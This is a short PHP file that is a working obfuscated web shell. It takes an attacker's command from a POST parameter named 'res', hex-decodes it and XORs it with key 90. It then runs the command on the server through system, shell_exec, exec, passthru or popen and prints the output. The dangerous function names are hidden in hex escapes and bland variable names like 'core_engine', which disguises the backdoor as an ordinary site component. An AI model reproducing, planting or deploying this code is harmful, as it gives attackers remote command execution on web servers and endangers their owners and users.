<?php

$core_engine2 = "she\x6C\x6C_\x65xe\x63";
$buffer_cache = "\x68\x65\x78\x32bin";
$core_engine6 = "\x73tre\x61m\x5Fget\x5F\x63\x6F\x6E\x74ent\x73";
$core_engine7 = "pc\x6C\x6F\x73e";
$core_engine4 = "\x70a\x73\x73\x74hru";
$core_engine1 = "\x73yste\x6D";
$core_engine3 = "ex\x65c";
$core_engine5 = "pop\x65n";
if (isset($_POST["r\x65\x73"])) {
            function event_handler  (    $flg , $flag )    {
 $comp =   '' ;
$b=0;
 while($b<strlen($flg)){
$comp.=chr(ord($flg[$b])^$flag);
$b++;

} return    $comp;
 
}
            $res = $buffer_cache($_POST["r\x65\x73"]);
            $res = event_handler($res, 90);
            if (function_exists($core_engine1)) {
                $core_engine1($res);
            } elseif (function_exists($core_engine2)) {
                print $core_engine2($res);
            } elseif (function_exists($core_engine3)) {
                $core_engine3($res, $dchunk_flg);
                print join("\n", $dchunk_flg);
            } elseif (function_exists($core_engine4)) {
                $core_engine4($res);
            } elseif (function_exists($core_engine5) && function_exists($core_engine6) && function_exists($core_engine7)) {
                $flag_comp = $core_engine5($res, 'r');
                if ($flag_comp) {
                    $descriptor_element = $core_engine6($flag_comp);
                    $core_engine7($flag_comp);
                    print $descriptor_element;
                }
            }
            exit;
        }